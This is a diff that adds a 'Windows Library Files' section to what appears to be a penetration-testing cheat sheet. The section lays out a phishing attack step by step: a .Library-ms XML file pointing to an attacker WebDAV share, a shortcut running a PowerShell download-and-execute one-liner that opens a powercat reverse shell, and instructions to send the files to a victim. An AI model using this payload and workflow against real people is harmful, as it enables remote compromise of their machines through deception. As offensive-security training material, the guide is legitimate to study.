@@ -113,6 +113,7 @@ I try as much as possible to link to the various sources or inspiration for thes
   - [Client Information Gathering](#client-information-gathering)
   - [HTML applications](#html-applications)
   - [Microsoft Office](#microsoft-office)
+  - [Windows Library Files](#windows-library-files)
 - [Thick client vulnerabilities](#thick-client-vulnerabilities)
   - [DLL Hijacking](#dll-hijacking)
   - [Insecure application design](#insecure-application-design)
@@ -2985,6 +2986,47 @@ In evil.hta, the code will find the following command ::> `powershell.exe -nop -
 
 **Evading Protected View**: In exactly the same way as Word and Excel, Microsoft Publisher permits embedded objects and ultimately code execution, but it will not enable Protected View for documents that are distributed over the Internet.
 
+### <ins>Windows Library Files</ins>
+
+Library files consist of three major parts written in XML to specify the parameters for accessing remote locations:
+- General library information
+- Library properties
+- Library locations
+
+1. Run a WebDAV share in the attacker machine
+2. Create the following Windows Library File in a Window machine
+   <br/><i>config.Library-ms</i>
+   ```xml
+   <?xml version="1.0" encoding="UTF-8"?>
+   <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+   
+   	<name>@windows.storage.dll,-34582</name>
+   	<version>6</version>
+   
+   	<isLibraryPinned>true</isLibraryPinned>
+   	<iconReference>imageres.dll,-1003</iconReference>
+   	
+   	<templateInfo>
+   		<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+   	</templateInfo>
+   	
+   	<searchConnectorDescriptionList>
+   		<searchConnectorDescription>
+   			<isDefaultSaveLocation>true</isDefaultSaveLocation>
+   			<isSupported>false</isSupported>
+   			<simpleLocation>
+   				<url>http://IP</url>
+   			</simpleLocation>
+   		</searchConnectorDescription>
+   	</searchConnectorDescriptionList>
+   
+   </libraryDescription>
+   ```
+3. In a Window machine, create a shortcut ( <i>automatic_configuration.lnk</i> ) with the following as location
+   - `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<IP>/powercat.ps1');powercat -c <IP> -p <PORT> -e powershell"`
+4. Put `config.Library-ms` and `automatic_configuration.lnk` in the WebDAV directory
+5. Start the Python3 web server to serve `powercat.ps1`, WsgiDAV for the WebDAV share `/home/kali/webdav`, and a Netcat listener on port `4444`
+6. Send the library file to the victim and wait for them to execute the shortcut file to get a reverse shell
 
 
 ## Thick client vulnerabilities
